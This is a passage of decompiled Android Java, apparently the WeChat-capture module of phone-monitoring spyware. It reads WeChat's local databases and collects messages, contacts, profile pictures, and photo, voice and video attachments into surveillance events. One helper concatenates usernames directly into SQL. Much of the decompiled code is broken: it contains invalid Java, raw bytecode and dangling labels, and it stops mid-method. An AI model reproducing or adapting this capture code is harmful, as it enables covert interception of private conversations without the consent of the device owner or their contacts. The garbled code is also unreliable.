        localStringBuilder.append("WHERE MyUncaughtExceptionHandler.username IN (");
        int i = 0;
        String str = null;
        for (int j = 0;; j = i)
        {
            i = paramArrayList.size();
            if (j >= i) {
                break;
            }
            localStringBuilder.append("'");
            str = (String)paramArrayList.get(j);
            localStringBuilder.append(str);
            str = "'";
            localStringBuilder.append(str);
            i = paramArrayList.size() + -1;
            if (j < i)
            {
                str = ",";
                localStringBuilder.append(str);
            }
            i = j + 1;
        }
        localStringBuilder.append(") ");
        return localStringBuilder.toString();
    }

    private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, long paramLong, String paramString, com.vvt.base.b paramb)
    {
        int i = 1;
        int j = 0;
        Object[] arrayOfObject = null;
        boolean bool1 = b;
        if (bool1) {}
        Object localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        String str = "SELECT filename FROM videoinfo2 WHERE (msgsvrid = " + paramLong + ")";
        boolean bool2 = false;
        localCursor = null;
        Object localObject3 = new Object[i];
        Object localObject4 = com.vvt.io.d.a();
        localObject3[0] = localObject4;
        localObject3 = String.format("%s/tencent/MicroMsg/", (Object[])localObject3);
        localObject1 = new java/util/ArrayList;
        ((ArrayList)localObject1).<init>();
        int k = 0;
        localObject4 = null;
        try
        {
            localObject4 = new String[0];
            localCursor = paramSQLiteDatabase.rawQuery(str, (String[])localObject4);
            if (localCursor != null)
            {
                boolean bool3 = localCursor.moveToFirst();
                if (bool3)
                {
                    str = "filename";
                    int m = localCursor.getColumnIndex(str);
                    str = localCursor.getString(m);
                    localObject4 = "%s.mp4";
                    j = 1;
                    arrayOfObject = new Object[j];
                    arrayOfObject[0] = str;
                    str = String.format((String)localObject4, arrayOfObject);
                    k = 3;
                    localObject1 = a(paramString, paramb, (String)localObject3, str, k);
                }
            }
            if (localCursor == null) {
                break label223;
            }
        }
        catch (Exception localException)
        {
            for (;;)
            {
                boolean bool4 = e;
                if ((bool4) && (localCursor == null)) {}
            }
        }
        finally
        {
            if (localCursor == null) {
                break label270;
            }
            localCursor.close();
        }
        localCursor.close();
        label223:
        bool2 = b;
        if (bool2) {}
        return (ArrayList)localObject1;
    }

    private static ArrayList a(SQLiteDatabase paramSQLiteDatabase1, String paramString1, Cursor paramCursor, com.vvt.base.b paramb, SQLiteDatabase paramSQLiteDatabase2, String paramString2)
    {
        ArrayList localArrayList1 = new java/util/ArrayList;
        localArrayList1.<init>();
        Object localObject1 = WeChatData.Direction.UNKNOWN;
        int i = 0;
        localObject1 = null;
        SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
        Object localObject2 = "dd/MM/yy HH:mm:ss";
        localSimpleDateFormat.<init>((String)localObject2);
        Object localObject3 = null;
        int i1 = paramCursor.moveToLast();
        if (i1 != 0)
        {
            i1 = b;
            if (i1 == 0) {}
        }
        for (Object localObject4 = null;; localObject4 = localObject2)
        {
            localObject1 = paramb.f();
            com.vvt.im.events.info.d locald = a(paramSQLiteDatabase1, paramString1, paramSQLiteDatabase2, paramString2, (String)localObject1);
            WeChatData localWeChatData = new com/vvt/capture/wechat/WeChatData;
            localWeChatData.<init>();
            f localf = new com/vvt/im/events/info/f;
            localf.<init>();
            com.vvt.im.events.info.b localb = new com/vvt/im/events/info/b;
            localb.<init>();
            new ArrayList();
            int i4 = 1;
            localObject1 = "isSend";
            i = paramCursor.getColumnIndex((String)localObject1);
            i = paramCursor.getInt(i);
            i1 = b;
            if (i1 != 0) {}
            i1 = 1;
            Object localObject5;
            String str1;
            String str2;
            String str3;
            int i5;
            long l1;
            long l2;
            String str4;
            ArrayList localArrayList2;
            label412:
            Object localObject6;
            Object localObject7;
            label471:
            boolean bool1;
            int i9;
            if (i == i1)
            {
                localObject1 = WeChatData.Direction.OUT;
                localObject5 = localObject1;
                i = paramCursor.getColumnIndex("content");
                str1 = paramCursor.getString(i);
                i = paramCursor.getColumnIndex("talker");
                str2 = paramCursor.getString(i);
                i = paramCursor.getColumnIndex("nickname");
                str3 = paramCursor.getString(i);
                i = paramCursor.getColumnIndex("type");
                i5 = paramCursor.getInt(i);
                i = paramCursor.getColumnIndex("createTime");
                l1 = paramCursor.getLong(i);
                i = paramCursor.getColumnIndex("msgSvrId");
                l2 = paramCursor.getLong(i);
                localObject1 = new java/util/Date;
                ((Date)localObject1).<init>(l1);
                str4 = localSimpleDateFormat.format((Date)localObject1);
                i = paramCursor.getColumnIndex("memberlist");
                localObject1 = paramCursor.getString(i);
                if (localObject1 == null) {
                    break label680;
                }
                int i2 = ((String)localObject1).length();
                if (i2 <= 0) {
                    break label680;
                }
                localObject2 = ";";
                localObject1 = ((String)localObject1).split((String)localObject2);
                localArrayList2 = new java/util/ArrayList;
                localObject1 = Arrays.asList((Object[])localObject1);
                localArrayList2.<init>((Collection)localObject1);
                localObject1 = locald.b();
                localArrayList2.remove(localObject1);
                String str5 = paramb.f();
                localObject1 = paramSQLiteDatabase1;
                localObject2 = paramString1;
                localObject6 = paramSQLiteDatabase2;
                localObject7 = paramString2;
                localObject7 = a(paramSQLiteDatabase1, paramString1, localArrayList2, paramSQLiteDatabase2, paramString2, str5);
                i = ((ArrayList)localObject7).size();
                i2 = 1;
                if (i <= i2) {
                    break label701;
                }
                i = 1;
                int i6 = i;
                bool1 = b;
                if (bool1) {}
                localObject1 = a(i5);
                i9 = a(str1, (MessageType)localObject1);
                bool1 = b;
                if (bool1) {}
                localObject1 = WeChatData.Direction.OUT;
                if (localObject5 != localObject1) {
                    break label716;
                }
                localObject1 = locald.b();
                localf.a((String)localObject1);
                localObject1 = locald.a();
                localf.b((String)localObject1);
                localObject1 = locald.d();
                localf.c((String)localObject1);
                localObject1 = locald.g();
                localf.e((String)localObject1);
                localObject6 = str1;
                localObject2 = localObject4;
            }
            label680:
            label701:
            boolean bool3;
            label716:
            int i10;
            for (;;)
            {
                localObject4 = ((ArrayList)localObject7).iterator();
                boolean bool5;
                for (;;)
                {
                    bool1 = ((Iterator)localObject4).hasNext();
                    if (!bool1) {
                        break;
                    }
                    localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
                    str1 = ((com.vvt.im.events.info.e)localObject1).d();
                    bool5 = str1.equals(localObject2);
                    if (bool5)
                    {
                        str1 = ((com.vvt.im.events.info.e)localObject1).f();
                        localf.c(str1);
                        localObject1 = ((com.vvt.im.events.info.e)localObject1).e();
                        localf.a((byte[])localObject1);
                    }
                }
                localObject1 = WeChatData.Direction.IN;
                localObject5 = localObject1;
                break;
                localArrayList2 = new java/util/ArrayList;
                localArrayList2.<init>();
                localArrayList2.add(str2);
                break label412;
                bool1 = false;
                localObject1 = null;
                bool3 = false;
                localArrayList2 = null;
                break label471;
                localObject1 = str1.split(":");
                int i3 = 0;
                localObject2 = null;
                localObject4 = localObject1[0];
                bool1 = b;
                if (bool1) {}
                localObject1 = new java/lang/StringBuilder;
                ((StringBuilder)localObject1).<init>();
                localObject1 = (String)localObject4 + ":";
                localObject1 = str1.replace((CharSequence)localObject1, "");
                localObject2 = ((String)localObject1).trim();
                bool1 = b;
                if (bool1) {}
                int j = ((ArrayList)localObject7).size();
                i10 = 1;
                if (j == i10)
                {
                    localObject1 = ((com.vvt.im.events.info.e)((ArrayList)localObject7).get(0)).f();
                    localf.c((String)localObject1);
                    localObject1 = ((com.vvt.im.events.info.e)((ArrayList)localObject7).get(0)).a();
                    localf.e((String)localObject1);
                    localObject1 = ((com.vvt.im.events.info.e)((ArrayList)localObject7).get(0)).d();
                    localf.a((String)localObject1);
                    localObject1 = ((com.vvt.im.events.info.e)((ArrayList)localObject7).get(0)).c();
                    localf.b((String)localObject1);
                    k = c;
                    if (k != 0)
                    {
                        localObject6 = localObject2;
                        localObject2 = localObject4;
                    }
                }
                else
                {
                    k = b;
                    if (k != 0) {}
                    localObject6 = ((ArrayList)localObject7).iterator();
                    do
                    {
                        k = ((Iterator)localObject6).hasNext();
                        if (k == 0) {
                            break;
                        }
                        localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject6).next();
                        str1 = ((com.vvt.im.events.info.e)localObject1).d();
                        bool5 = str1.equals(localObject4);
                    } while (!bool5);
                    localObject6 = ((com.vvt.im.events.info.e)localObject1).f();
                    localf.c((String)localObject6);
                    localObject6 = ((com.vvt.im.events.info.e)localObject1).a();
                    localf.e((String)localObject6);
                    localObject6 = ((com.vvt.im.events.info.e)localObject1).d();
                    localf.a((String)localObject6);
                    localObject1 = ((com.vvt.im.events.info.e)localObject1).c();
                    localf.b((String)localObject1);
                    k = c;
                    if (k == 0) {}
                }
                localObject6 = localObject2;
                localObject2 = localObject4;
            }
            int k = 1;
            if (i5 != k)
            {
                m = 3;
                if (i5 != m)
                {
                    m = 48;
                    if (i5 != m)
                    {
                        m = 34;
                        if (i5 != m)
                        {
                            m = 62;
                            if (i5 != m)
                            {
                                m = 43;
                                if (i5 != m) {
                                    break label1594;
                                }
                            }
                        }
                    }
                }
            }
            int m = 48;
            boolean bool2;
            if (i5 == m)
            {
                if (bool3)
                {
                    localObject1 = WeChatData.Direction.IN;
                    if (localObject5 == localObject1)
                    {
                        localObject1 = "<msg>";
                        m = ((String)localObject6).indexOf((String)localObject1);
                        bool3 = b;
                        if ((!bool3) || (m > 0)) {
                            localObject6 = ((String)localObject6).substring(m);
                        }
                        bool2 = b;
                        if (!bool2) {}
                    }
                }
                localObject3 = b((String)localObject6);
                bool3 = i4;
                localObject1 = localObject3;
            }
            for (;;)
            {
                boolean bool4;
                if (bool3)
                {
                    localWeChatData.a((com.vvt.im.events.info.c)localObject1);
                    localWeChatData.a(i9);
                    localWeChatData.a(l1);
                    localWeChatData.b(str4);
                    localWeChatData.a((String)localObject6);
                    localWeChatData.a((WeChatData.Direction)localObject5);
                    int i7 = ((ArrayList)localObject7).size();
                    i10 = 1;
                    if (i7 > i10)
                    {
                        i7 = 1;
                        localWeChatData.a(i7);
                    }
                    localWeChatData.a((List)localObject7);
                    localWeChatData.a(locald);
                    localWeChatData.a(localf);
                    localb.a(str2);
                    localb.b(str3);
                    localWeChatData.a(localb);
                    localArrayList1.add(localWeChatData);
                    bool4 = b;
                    if (!bool4) {}
                }
                for (;;)
                {
                    bool4 = paramCursor.moveToPrevious();
                    if (bool4) {
                        break label1612;
                    }
                    bool2 = b;
                    if (bool2) {}
                    return localArrayList1;
                    int n = 3;
                    if (i5 == n)
                    {
                        localObject1 = c(paramSQLiteDatabase1, l2, paramString1, paramb);
                        i8 = ((ArrayList)localObject1).size();
                        if (i8 > 0)
                        {
                            localWeChatData.b((List)localObject1);
                            i8 = i4;
                            localObject1 = localObject3;
                            break;
                        }
                        n = 0;
                        i8 = 0;
                        localArrayList2 = null;
                        localObject1 = localObject3;
                        break;
                    }
                    n = 34;
                    if (i5 == n)
                    {
                        localObject1 = b(paramSQLiteDatabase1, l2, paramString1, paramb);
                        i8 = ((ArrayList)localObject1).size();
                        if (i8 > 0)
                        {
                            localWeChatData.b((List)localObject1);
                            i8 = i4;
                            localObject1 = localObject3;
                            break;
                        }
                        n = 0;
                        i8 = 0;
                        localArrayList2 = null;
                        localObject1 = localObject3;
                        break;
                    }
                    n = 62;
                    if (i5 != n)
                    {
                        n = 43;
                        if (i5 != n) {
                            break label1601;
                        }
                    }
                    localObject1 = a(paramSQLiteDatabase1, l2, paramString1, paramb);
                    i8 = ((ArrayList)localObject1).size();
                    if (i8 > 0)
                    {
                        localWeChatData.b((List)localObject1);
                        i8 = i4;
                        localObject1 = localObject3;
                        break;
                    }
                    n = 0;
                    i8 = 0;
                    localArrayList2 = null;
                    localObject1 = localObject3;
                    break;
                    label1594:
                    localObject1 = localObject3;
                }
                label1601:
                int i8 = i4;
                localObject1 = localObject3;
            }
            label1612:
            localObject3 = localObject1;
        }
    }

    /* Error */
    private static ArrayList a(SQLiteDatabase paramSQLiteDatabase1, String paramString1, ArrayList paramArrayList, SQLiteDatabase paramSQLiteDatabase2, String paramString2, String paramString3)
    {
        // Byte code:
        //   0: getstatic 17	com/vvt/capture/wechat/removeFromPath:removeFromPath	Z
        //   3: istore 6
        //   5: iload 6
        //   7: ifeq +3 -> 10
        //   10: new 175	java/util/ArrayList
        //   13: astore 7
        //   15: aload 7
        //   17: invokespecial 176	java/util/ArrayList:<init>	()V
        //   20: aload_2
        //   21: invokestatic 573	com/vvt/capture/wechat/removeFromPath:a	(Ljava/util/ArrayList;)Ljava/lang/String;
        //   24: astore 8
        //   26: iconst_0
        //   27: istore 6
        //   29: aconst_null
        //   30: astore 9
        //   32: iconst_0
        //   33: istore 10
        //   35: aconst_null
        //   36: astore 11
        //   38: iconst_0
        //   39: anewarray 143	java/lang/String
        //   42: astore 11
        //   44: aload_0
        //   45: aload 8
        //   47: aload 11
        //   49: invokevirtual 147	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
        //   52: astore 9
        //   54: aload 9
        //   56: ifnull +187 -> 243
        //   59: aload 9
        //   61: invokeinterface 131 1 0
        //   66: istore 12
        //   68: iload 12
        //   70: ifeq +173 -> 243
        //   73: new 192	com/vvt/im/events/info/e
        //   76: astore 8
        //   78: aload 8
        //   80: invokespecial 574	com/vvt/im/events/info/e:<init>	()V
        //   83: ldc_w 576
        //   86: astore 11
        //   88: aload 9
        //   90: aload 11
        //   92: invokeinterface 108 2 0
        //   97: istore 10
        //   99: aload 9
        //   101: iload 10
        //   103: invokeinterface 159 2 0
        //   108: astore 11
        //   110: ldc_w 434
        //   113: astore 13
        //   115: aload 9
        //   117: aload 13
        //   119: invokeinterface 108 2 0
        //   124: istore 14
        //   126: aload 9
        //   128: iload 14
        //   130: invokeinterface 159 2 0
        //   135: astore 13
        //   137: aload_1
        //   138: aload 11
        //   140: aload 4
        //   142: aload_3
        //   143: aload 5
        //   145: invokestatic 579	com/vvt/capture/wechat/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
        //   148: astore 15
        //   150: aload 8
        //   152: aload 11
        //   154: invokevirtual 581	com/vvt/im/events/info/e:d	(Ljava/lang/String;)V
        //   157: aload 8
        //   159: aload 13
        //   161: invokevirtual 582	com/vvt/im/events/info/e:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
        //   164: aload 8
        //   166: aload 15
        //   168: invokevirtual 583	com/vvt/im/events/info/e:a	(Ljava/lang/String;)V
        //   171: aload 7
        //   173: aload 8
        //   175: invokevirtual 180	java/util/ArrayList:add	(Ljava/lang/Object;)Z
        //   178: pop
        //   179: goto -120 -> 59
        //   182: astore 8
        //   184: getstatic 26	com/vvt/capture/wechat/removeFromPath:e	Z
        //   187: istore 12
        //   189: iload 12
        //   191: ifeq +3 -> 194
        //   194: aload 9
        //   196: ifnull +10 -> 206
        //   199: aload 9
        //   201: invokeinterface 115 1 0
        //   206: getstatic 17	com/vvt/capture/wechat/removeFromPath:removeFromPath	Z
        //   209: istore 6
        //   211: iload 6
        //   213: ifeq +3 -> 216
        //   216: aload 7
        //   218: areturn
        //   219: astore 16
        //   221: aconst_null
        //   222: astore 7
        //   224: aload 16
        //   226: astore 9
        //   228: aload 7
        //   230: ifnull +10 -> 240
        //   233: aload 7
        //   235: invokeinterface 115 1 0
        //   240: aload 9
        //   242: athrow
        //   243: aload 9
        //   245: ifnull -39 -> 206
        //   248: goto -49 -> 199
        //   251: astore 16
        //   253: aload 9
        //   255: astore 7
        //   257: aload 16
        //   259: astore 9
        //   261: goto -33 -> 228
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	264	0	paramSQLiteDatabase1	SQLiteDatabase
        //   0	264	1	paramString1	String
        //   0	264	2	paramArrayList	ArrayList
        //   0	264	3	paramSQLiteDatabase2	SQLiteDatabase
        //   0	264	4	paramString2	String
        //   0	264	5	paramString3	String
        //   3	209	6	bool1	boolean
        //   13	243	7	localObject1	Object
        //   24	150	8	localObject2	Object
        //   182	1	8	localException	Exception
        //   30	230	9	localObject3	Object
        //   33	69	10	i	int
        //   36	117	11	localObject4	Object
        //   66	124	12	bool2	boolean
        //   113	47	13	str1	String
        //   124	5	14	j	int
        //   148	19	15	str2	String
        //   219	6	16	localObject5	Object
        //   251	7	16	localObject6	Object
        // Exception table:
        //   from	to	target	type
        //   38	42	182	java/lang/Exception
        //   47	52	182	java/lang/Exception
        //   59	66	182	java/lang/Exception
        //   73	76	182	java/lang/Exception
        //   78	83	182	java/lang/Exception
        //   90	97	182	java/lang/Exception
        //   101	108	182	java/lang/Exception
        //   117	124	182	java/lang/Exception
        //   128	135	182	java/lang/Exception
        //   143	148	182	java/lang/Exception
        //   152	157	182	java/lang/Exception
        //   159	164	182	java/lang/Exception
        //   166	171	182	java/lang/Exception
        //   173	179	182	java/lang/Exception
        //   38	42	219	finally
        //   47	52	219	finally
        //   59	66	251	finally
        //   73	76	251	finally
        //   78	83	251	finally
        //   90	97	251	finally
        //   101	108	251	finally
        //   117	124	251	finally
        //   128	135	251	finally
        //   143	148	251	finally
        //   152	157	251	finally
        //   159	164	251	finally
        //   166	171	251	finally
        //   173	179	251	finally
        //   184	187	251	finally
    }

    public static ArrayList a(String paramString1, long paramLong1, long paramLong2, SQLiteDatabase paramSQLiteDatabase1, com.vvt.base.b paramb, SQLiteDatabase paramSQLiteDatabase2, String paramString2)
    {
        boolean bool1 = b;
        if (bool1) {}
        ArrayList localArrayList1 = new java/util/ArrayList;
        localArrayList1.<init>();
        Cursor localCursor = null;
        if (paramSQLiteDatabase1 != null) {}
        for (;;)
        {
            try
            {
                localObject1 = c();
                int i = 2;
                localObject3 = new String[i];
                k = 0;
                localObject4 = new java/lang/StringBuilder;
                ((StringBuilder)localObject4).<init>();
                localObject4 = ((StringBuilder)localObject4).append(paramLong1);
                str = "";
                localObject4 = ((StringBuilder)localObject4).append(str);
                localObject4 = ((StringBuilder)localObject4).toString();
                localObject3[0] = localObject4;
                k = 1;
                localObject4 = new java/lang/StringBuilder;
                ((StringBuilder)localObject4).<init>();
                localObject4 = ((StringBuilder)localObject4).append(paramLong2);
                str = "";
                localObject4 = ((StringBuilder)localObject4).append(str);
                localObject4 = ((StringBuilder)localObject4).toString();
                localObject3[k] = localObject4;
                localCursor = paramSQLiteDatabase1.rawQuery((String)localObject1, (String[])localObject3);
                if (localCursor == null) {
                    continue;
                }
                localObject1 = paramSQLiteDatabase1;
                localObject3 = paramString1;
                localObject4 = paramSQLiteDatabase2;
                str = paramString2;
                localArrayList1 = a(paramSQLiteDatabase1, paramString1, localCursor, paramb, paramSQLiteDatabase2, paramString2);
                localObject1 = localArrayList1;
            }
            catch (Exception localException)
            {
                Object localObject1;
                Object localObject3;
                int k;
                Object localObject4;
                String str;
                boolean bool2;
                long l;
                int j;
                bool1 = e;
                if ((bool1) && (localCursor == null)) {
                    continue;
                }
                localCursor.close();
                ArrayList localArrayList2 = localArrayList1;
                continue;
            }
            finally
            {
                if (localCursor == null) {
                    continue;
                }
                localCursor.close();
            }
            bool2 = b;
            if (bool2) {}
            return (ArrayList)localObject1;
            l = 3000L;
            SystemClock.sleep(l);
            localObject1 = c();
            j = 2;
            localObject3 = new String[j];
            k = 0;
            localObject4 = new java/lang/StringBuilder;
            ((StringBuilder)localObject4).<init>();
            localObject4 = ((StringBuilder)localObject4).append(paramLong1);
            str = "";
            localObject4 = ((StringBuilder)localObject4).append(str);
            localObject4 = ((StringBuilder)localObject4).toString();
            localObject3[0] = localObject4;
            k = 1;
            localObject4 = new java/lang/StringBuilder;
            ((StringBuilder)localObject4).<init>();
            localObject4 = ((StringBuilder)localObject4).append(paramLong2);
            str = "";
            localObject4 = ((StringBuilder)localObject4).append(str);
            localObject4 = ((StringBuilder)localObject4).toString();
            localObject3[k] = localObject4;
            localCursor = paramSQLiteDatabase1.rawQuery((String)localObject1, (String[])localObject3);
            if (localCursor != null)
            {
                localObject1 = paramSQLiteDatabase1;
                localObject3 = paramString1;
                localObject4 = paramSQLiteDatabase2;
                str = paramString2;
                localArrayList1 = a(paramSQLiteDatabase1, paramString1, localCursor, paramb, paramSQLiteDatabase2, paramString2);
                localObject1 = localArrayList1;
            }
            else
            {
                ArrayList localArrayList3 = localArrayList1;
            }
        }
    }

    private static ArrayList a(String paramString1, com.vvt.base.b paramb, String paramString2, String paramString3, int paramInt)
    {
        boolean bool1 = b;
        if (bool1) {}
        ArrayList localArrayList = new java/util/ArrayList;
        localArrayList.<init>();
        Object localObject1 = ImType.WECHAT;
        Object localObject2 = ImMediaFileType.THUMBMAIL;
        localObject1 = com.vvt.im.a.c.a(paramString1, (ImType)localObject1, (ImMediaFileType)localObject2);
        localObject2 = com.vvt.capture.wechat.b.d.a(paramString1);
        boolean bool2 = b;
        if (bool2) {}
        Object localObject3 = com.vvt.capture.wechat.b.d.a(paramString1, paramString2, paramString3);
        int i = com.vvt.ag.b.a((String)localObject3);
        String str;
        if (i == 0)
        {
            long l = ShellUtil.c((String)localObject3);
            boolean bool3 = b;
            if (bool3) {}
            i = a(paramInt, paramb, l);
            if (i == 0) {
                break label390;
            }
            i = com.vvt.ag.b.a((String)localObject3);
            if (i == 0)
            {
                str = paramb.f();
                localObject1 = com.vvt.capture.wechat.b.d.a((String)localObject3, (String)localObject1, (String)localObject2, str);
                boolean bool4 = b;
                if (bool4) {}
                bool4 = com.vvt.ag.b.a((String)localObject1);
                if (bool4) {
                    break label377;
                }
                localObject2 = new java/io/File;
                ((File)localObject2).<init>((String)localObject1);
                localObject2 = ((File)localObject2).getName();
                localObject3 = new com/vvt/im/events/info/a;
                ((com.vvt.im.events.info.a)localObject3).<init>();
                ((com.vvt.im.events.info.a)localObject3).a((String)localObject2);
                ((com.vvt.im.events.info.a)localObject3).c((String)localObject1);
                ((com.vvt.im.events.info.a)localObject3).d((String)localObject1);
                i = 1;
                if (paramInt != i) {
                    break label254;
                }
                localObject1 = "image/jpg";
                ((com.vvt.im.events.info.a)localObject3).b((String)localObject1);
                localArrayList.add(localObject3);
            }
        }
        for (;;)
        {
            boolean bool5 = b;
            if (bool5) {}
            return localArrayList;
            label254:
            i = 4;
            if (paramInt == i)
            {
                bool5 = a((String)localObject1);
                if (bool5)
                {
                    str = "slk";
                    localObject1 = ((String)localObject2).replace("amr", str);
                    ((com.vvt.im.events.info.a)localObject3).a((String)localObject1);
                    localObject1 = "audio/slk";
                    ((com.vvt.im.events.info.a)localObject3).b((String)localObject1);
                    break;
                }
                ((com.vvt.im.events.info.a)localObject3).a((String)localObject2);
                localObject1 = "audio/amr";
                ((com.vvt.im.events.info.a)localObject3).b((String)localObject1);
                break;
            }
            int j = 3;
            if (paramInt != j) {
                break;
            }
            localObject1 = a(paramString1, (String)localObject1);
            ((com.vvt.im.events.info.a)localObject3).d((String)localObject1);
            localObject1 = "video/mp4";
            ((com.vvt.im.events.info.a)localObject3).b((String)localObject1);
            break;
            label377:
            bool5 = e;
            if (bool5)
            {
                continue;
                label390:
                bool5 = e;
                if (!bool5) {}
            }
        }
    }

    public static ArrayList a(String paramString1, String paramString2, String paramString3, long paramLong1, long paramLong2, String paramString4, com.vvt.base.b paramb)
    {
        boolean bool1 = b;
        if (bool1) {}
        ArrayList localArrayList1 = new java/util/ArrayList;
        localArrayList1.<init>();
        SQLiteDatabase localSQLiteDatabase1 = null;
        SQLiteDatabase localSQLiteDatabase2 = null;
        for (;;)
        {
            try
            {
                localSQLiteDatabase1 = com.vvt.capture.wechat.a.a.a(paramString1, paramString2, paramString3, paramString4);
                localSQLiteDatabase2 = com.vvt.capture.wechat.a.a.a(paramString2);
                if (localSQLiteDatabase1 == null) {
                    break label163;
                }
                localObject1 = paramString1;
                localObject1 = a(paramString1, paramLong1, paramLong2, localSQLiteDatabase1, paramb, localSQLiteDatabase2, paramString2);
            }
            catch (Exception localException)
            {
                Object localObject1;
                boolean bool2;
                bool1 = e;
                if ((bool1) && (localSQLiteDatabase1 == null)) {
                    continue;
                }
                localSQLiteDatabase1.close();
                if (localSQLiteDatabase2 == null) {
                    continue;
                }
                localSQLiteDatabase2.close();
                ArrayList localArrayList2 = localArrayList1;
                continue;
            }
            finally
            {
                if (localSQLiteDatabase1 == null) {
                    continue;
                }
                localSQLiteDatabase1.close();
                if (localSQLiteDatabase2 == null) {
                    continue;
                }
                localSQLiteDatabase2.close();
            }
            bool2 = b;
            if (bool2) {}
            return (ArrayList)localObject1;
            label163:
            ArrayList localArrayList3 = localArrayList1;
        }
    }

    public static List a(WeChatData paramWeChatData)
    {
        ArrayList localArrayList = new java/util/ArrayList;
        localArrayList.<init>();
        Object localObject1 = new com/vvt/events/FxIMAccountEvent;
        ((FxIMAccountEvent)localObject1).<init>();
        long l1 = paramWeChatData.b();
        ((FxIMAccountEvent)localObject1).setEventTime(l1);
        int i = FxIMMessageServiceType.WECHAT.getValue();
        ((FxIMAccountEvent)localObject1).setImServiceId(i);
        Object localObject2 = paramWeChatData.f().b();
        ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
        localObject2 = paramWeChatData.f().a();
        ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
        localObject2 = paramWeChatData.f().c();
        ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
        localObject2 = paramWeChatData.f().g();
        ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
        localObject2 = paramWeChatData.f().d();
        ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
        localArrayList.add(localObject1);
        localObject2 = new com/vvt/events/FxIMConversationEvent;
        ((FxIMConversationEvent)localObject2).<init>();
        l1 = paramWeChatData.b();
        ((FxIMConversationEvent)localObject2).setEventTime(l1);
        int j = FxIMMessageServiceType.WECHAT.getValue();
        ((FxIMConversationEvent)localObject2).setImServiceId(j);
        localObject1 = paramWeChatData.i().a();
        ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
        localObject1 = paramWeChatData.f().b();
        ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
        localObject1 = paramWeChatData.i().c();
        ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
        localObject1 = paramWeChatData.i().d();
        ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
        localObject1 = paramWeChatData.i().b();
        ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
        localObject1 = paramWeChatData.i().e();
        ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
        Object localObject3 = new java/util/HashSet;
        ((HashSet)localObject3).<init>();
        localObject1 = paramWeChatData.e();
        Object localObject4 = ((List)localObject1).iterator();
        boolean bool1;
        Object localObject6;
        for (;;)
        {
            bool1 = ((Iterator)localObject4).hasNext();
            if (!bool1) {
                break;
            }
            localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
            localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
            localObject6 = paramWeChatData.f().b();
            boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
            if (!bool4)
            {
                localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
                ((HashSet)localObject3).add(localObject1);
            }
        }
        ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
        localArrayList.add(localObject2);
        localObject1 = paramWeChatData.e();
        localObject2 = ((List)localObject1).iterator();
        for (;;)
        {
            bool1 = ((Iterator)localObject2).hasNext();
            if (!bool1) {
                break;
            }
            localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
            localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
            localObject4 = paramWeChatData.f().b();
            boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
            if (!bool5)
            {
                localObject3 = new com/vvt/events/FxIMContactEvent;
                ((FxIMContactEvent)localObject3).<init>();
                localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
                ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
                localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
                ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
                localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
                ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
                localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
                ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
                localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
                ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
                long l2 = paramWeChatData.b();
                ((FxIMContactEvent)localObject3).setEventTime(l2);
                int k = FxIMMessageServiceType.WECHAT.getValue();
                ((FxIMContactEvent)localObject3).setImServiceId(k);
                localObject1 = paramWeChatData.f().b();
                ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
                localArrayList.add(localObject3);
            }
        }
        localObject3 = new com/vvt/events/FxIMMessageEvent;
        ((FxIMMessageEvent)localObject3).<init>();
        localObject4 = new java/util/ArrayList;
        ((ArrayList)localObject4).<init>();
        localObject1 = paramWeChatData.j();
        localObject2 = ((List)localObject1).iterator();
        for (;;)
        {
            bool2 = ((Iterator)localObject2).hasNext();
            if (!bool2) {
                break;
            }
            localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
            localObject5 = new com/vvt/events/d;
            ((com.vvt.events.d)localObject5).<init>();
            localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
            ((com.vvt.events.d)localObject5).b((byte[])localObject6);
            localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
            ((com.vvt.events.d)localObject5).a((String)localObject6);
            localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
            ((com.vvt.events.d)localObject5).b((String)localObject6);
            localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
